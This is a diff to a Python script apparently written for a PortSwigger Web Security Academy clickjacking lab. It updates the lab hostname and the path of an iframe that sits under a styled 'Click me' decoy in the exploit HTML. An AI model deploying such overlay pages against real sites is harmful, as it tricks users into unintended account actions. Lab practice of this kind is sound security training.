@@ -1,7 +1,7 @@
 import requests
 from bs4 import BeautifulSoup
 
-site = 'acce1f2b1feb2ec5c08506e600f00072.web-security-academy.net'
+site = 'ace51f241e3a9908c017805e006d00f7.web-security-academy.net'
 
 s = requests.Session()
 site_url = f'https://{site}/'
@@ -25,7 +25,7 @@ exploit_html = f'''<style>
    }}
 </style>
 <div>Click me</div>
-<iframe src="https://{site}/account"></iframe>
+<iframe src="https://{site}/my-account"></iframe>
 '''
 
 formData = {
